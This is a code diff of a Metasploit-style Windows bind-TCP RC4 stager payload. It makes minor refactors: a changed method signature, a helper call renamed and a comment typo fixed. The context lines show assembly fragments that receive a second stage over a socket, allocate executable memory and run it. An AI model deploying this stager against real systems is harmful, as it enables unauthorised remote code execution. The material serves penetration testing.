@@ -17,7 +17,7 @@ module Payload::Windows::BindTcpRc4
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
     conf = {
       port:     datastore['LPORT'],
@@ -27,7 +27,7 @@ module Payload::Windows::BindTcpRc4
     }
 
     # Generate the more advanced stager if we have the space
-    if self.available_space && required_space <= self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
@@ -61,7 +61,7 @@ module Payload::Windows::BindTcpRc4
         push 4                  ; length = sizeof( DWORD );
         push esi                ; the 4 byte buffer on the stack to hold the second stage length
         push edi                ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        push #{block_api_hash('ws2_32.dll', 'recv')}
         call ebp                ; recv( s, &dwLength, 4, 0 );
     ^
 
@@ -80,10 +80,10 @@ module Payload::Windows::BindTcpRc4
           lea ecx, [esi+0x100] ; ECX = stage length + S-box length (alloc length)
         push  0x40             ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; MEM_COMMIT
-      ; push esi               ; push the newly recieved second stage length.
+      ; push esi               ; push the newly received second stage length.
           push ecx             ; push the alloc length
         push 0                 ; NULL as we dont care where the allocation is.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
       ; Receive the second stage and execute it...
       ; xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
@@ -96,7 +96,7 @@ module Payload::Windows::BindTcpRc4
         push esi               ; length
         push ebx               ; the current address into our second stage's RWX buffer
         push edi               ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        push #{block_api_hash('ws2_32.dll', 'recv')}
         call ebp               ; recv( s, buffer, length, 0 );
     ^
 
@@ -138,7 +138,7 @@ module Payload::Windows::BindTcpRc4
       else
         asm << %Q^
       failure:
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        push #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call ebp
         ^
       end
